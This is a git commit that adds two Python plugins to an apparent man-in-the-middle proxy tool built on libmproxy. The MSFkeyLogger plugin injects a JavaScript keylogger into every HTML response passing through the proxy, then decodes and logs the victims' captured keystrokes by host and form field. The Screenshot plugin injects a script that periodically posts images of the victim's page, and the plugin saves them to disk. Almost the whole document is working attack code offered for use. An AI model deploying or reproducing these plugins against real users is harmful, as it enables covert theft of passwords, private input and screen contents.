f4fb84d919b42f65cc5e336f422651cc87362b8a
xtr4nge <xtr4nge@gmail.com>
2015-06-27 11:07:09 +0100

    MSFkeyLogger and Screenshot plugins have been added

---
+++ plugins/MSFkeyLogger.py
@@ -0,0 +1,69 @@
+#!/usr/bin/env python
+
+# Copyright (C) 2015 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
+from plugins.plugin import Plugin
+from libmproxy.protocol.http import decoded
+
+import logging
+fruityproxy_logger = logging.getLogger("fruityproxy")
+
+'''
+Based on MITMf JSkeyLogger plugin: https://github.com/byt3bl33d3r/MITMf/
+'''
+
+class MSFkeyLogger(Plugin):
+    name = 'MSFkeyLogger'
+    desc = 'Injects a javascript keylogger into clients webpages'
+    content_path = "./content/MSFkeyLogger/msfkeylogger.js"
+
+    def request(self, flow):
+        if flow.request.method == 'POST' and ('keylog' in flow.request.path):
+
+            raw_keys = flow.request.content.split("&&")[0]
+            input_field = flow.request.content.split("&&")[1]
+
+            keys = raw_keys.split(",")
+            if keys:
+                del keys[0]; del(keys[len(keys)-1])
+
+                nice = ''
+                for n in keys:
+                    if n == '9':
+                        nice += "<TAB>"
+                    elif n == '8':
+                        nice = nice[:-1]
+                    elif n == '13':
+                        nice = ''
+                    else:
+                        try:
+                            nice += n.decode('hex')
+                        except:
+                            context.log("[JSKeylogger] Error decoding char: {}".format(n))
+
+                fruityproxy_logger.debug("["+self.name+"] Host: {} | Field: {} | Keys: {}".format(flow.request.host, input_field, nice))
+
+    def response(self, flow):
+        with decoded(flow.response):
+            
+            inject_content = ""
+            with open(self.content_path, 'r') as f:
+                for line in f:
+                    inject_content += line
+            
+            flow.response.content = flow.response.content.replace("</body>", "<script>" + inject_content + "</script></body>")
+            
---
+++ plugins/Screenshot.py
@@ -0,0 +1,61 @@
+#!/usr/bin/env python
+
+# Copyright (C) 2015 xtr4nge [_AT_] gmail.com, Marcello Salvati (@byt3bl33d3r)
+#
+# This program is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this program.  If not, see <http://www.gnu.org/licenses/>.
+#
+
+from plugins.plugin import Plugin
+from libmproxy.protocol.http import decoded
+
+import logging
+fruityproxy_logger = logging.getLogger("fruityproxy")
+
+import base64
+import urllib
+import re
+from datetime import datetime
+
+'''
+Based on MITMf Screenshotter plugin: https://github.com/byt3bl33d3r/MITMf/
+'''
+
+class Screenshot(Plugin):
+    name = 'Screenshot'
+    replace_str = "</body>"
+    content_path = "./content/Screenshot/screenshot.js"
+    interval = 10
+    
+    def request(self, flow):
+        
+        if 'saveshot' in flow.request.path:
+            flow.request.printPostData = False
+            #client = flow.request.client.getClientIP()
+            client = flow.client_conn.address()[0]
+            img_file = '{}-{}-{}.png'.format(client, flow.request.headers['host'], datetime.now().strftime("%Y-%m-%d_%H:%M:%S:%s"))
+            try:
+                with open('./logs/' + img_file, 'wb') as img:
+                    img.write(base64.b64decode(urllib.unquote(flow.request.content).decode('utf8').split(',')[1]))
+                    img.close()
+
+                fruityproxy_logger.debug('[ScreenShotter] {} Saved screenshot to {}'.format(client, img_file))
+            except Exception as e:
+                fruityproxy_logger.debug('[ScreenShotter] {} Error saving screenshot: {}'.format(client, e))        
+        
+    def response(self, flow):
+        with decoded(flow.response):
+            
+            canvas = re.sub("SECONDS_GO_HERE", str(self.interval*1000), open(self.content_path, "rb").read())
+            flow.response.content = flow.response.content.replace(self.replace_str, '<script type="text/javascript">' + canvas + '</script>' + self.replace_str)
+            
